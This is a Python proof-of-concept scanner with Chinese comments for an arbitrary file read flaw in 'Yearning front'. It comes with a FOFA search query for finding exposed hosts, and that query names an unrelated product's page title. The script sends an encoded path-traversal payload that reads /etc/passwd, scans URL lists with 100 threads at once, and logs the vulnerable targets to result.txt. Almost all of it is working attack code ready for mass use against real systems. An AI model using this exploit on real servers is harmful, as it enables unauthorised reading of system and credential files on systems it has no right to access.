# Yearning front 任意文件读取

#fofa语法：title="欢迎使用脸爱云 一脸通智慧管理平台"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

 __     __                   _                __                 _   
 \ \   / /                  (_)              / _|               | |  
  \ \_/ /__  __ _ _ __ _ __  _ _ __   __ _  | |_ _ __ ___  _ __ | |_ 
   \   / _ \/ _` | '__| '_ \| | '_ \ / _` | |  _| '__/ _ \| '_ \| __|
    | |  __/ (_| | |  | | | | | | | | (_| | | | | | | (_) | | | | |_ 
    |_|\___|\__,_|_|  |_| |_|_|_| |_|\__, | |_| |_|  \___/|_| |_|\__|
                                      __/ |                          
                                     |___/                           
                                                                             
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Yearning front")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd'
    url = target + url_payload
    header = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,verify=False)
        if res.status_code == 200 and "root"in res.text:
            print(f"f[+]该url存在任意文件读取漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件读取漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()